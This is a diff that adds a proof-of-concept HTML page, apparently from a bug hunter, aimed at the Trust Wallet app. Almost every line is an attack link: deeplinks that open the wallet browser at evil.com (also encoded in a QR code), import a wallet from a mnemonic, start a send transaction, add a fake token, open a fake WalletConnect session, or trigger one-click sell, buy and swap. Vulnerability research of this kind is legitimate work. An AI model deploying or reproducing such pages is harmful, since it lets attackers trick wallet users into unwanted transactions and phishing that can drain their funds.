@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Trust Wallet Deeplink PoC</title>
+  <style>
+    body { font-family: sans-serif; text-align: center; padding: 20px; }
+    .btn {
+      display: block; margin: 10px auto; padding: 12px 20px;
+      background: #3671E9; color: white; border-radius: 5px;
+      text-decoration: none; width: 90%; max-width: 400px;
+    }
+    h1 { color: #333; }
+  </style>
+</head>
+<body>
+  <h1>Trust Wallet Deeplink PoC</h1>
+
+  <a class="btn" href="trust://browser?url=https://evil.com" target="_blank">Browser Auto Download (trust://)</a>
+  <a class="btn" href="https://link.trustwallet.com/open_url?url=bughunter-6.github.io/SummaTest/dnspf.html" target="_blank">Browser Auto Download (Universal Link)</a>
+  <a class="btn" href="trust://open_url?coin_id=60&address=0x1234567890abcdef" target="_blank">Open Token Page</a>
+  <a class="btn" href="trust://add_token?contract_address=0xdeadbeef&symbol=FAKE&decimals=18" target="_blank">Add Custom Token</a>
+  <a class="btn" href="trust://send?coin=60&address=0xabcdef1234&amount=0.01" target="_blank">Initiate Send Transaction</a>
+  <a class="btn" href="trust://import_wallet?mnemonic=one+two+three+four+five" target="_blank">Import Wallet (Unsafe)</a>
+  <a class="btn" href="https://link.trustwallet.com/wc?uri=wc%3Aca1fccc0-f4d1-46c2-90b7-c07fce1c0cae%401%3Fbridge%3Dhttps%253A%252F%252Fbridge.walletconnect.org%26key%3Da413d90751839c7628873557c718fd73fcedc5e8e8c07cfecaefc0d3a178b1d8" target="_blank">Fake Wallet Connect sesion</a>
+  <a class="btn" href="https://link.trustwallet.com/sell?asset=c60_t0x6B175474E89094C44Da98b954EedeAC495271d0F" target="_blank">One Click Sell Asset</a>
+  <a class="btn" href="https://link.trustwallet.com/buy?asset=c60&provider=moonpay&payment_method=digital_wallet&sub_payment_method=paypal&fiat_currency=USD&fiat_quantity=300" target="_blank"> To Buy</a>
+  <a class="btn" href="trust://switch_wallet?network=binance" target="_blank">Switch Network</a>
+<a class="btn" href="https://link.trustwallet.com/swap?from=c60_t0x6B175474E89094C44Da98b954EedeAC495271d0F&to=c60" target="_blank"> Swap</a>
+<a class="btn" href="https://link.trustwallet.com/referrale" target="_blank">Fake refer</a>
+  <a class="btn" href="trust://switch_wallet?network=binance" target="_blank">Switch Network</a>
+  <a class="btn" href="trust://switch_wallet?network=binance" target="_blank">Switch Network</a>
+  <a class="btn" href="trust://switch_wallet?network=binance" target="_blank">Switch Network</a>
+<br></br>
+    <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=trust://browser?url=https://evil.com" alt="QR Code to Evil.com">
+
+
+</body>
+</html>
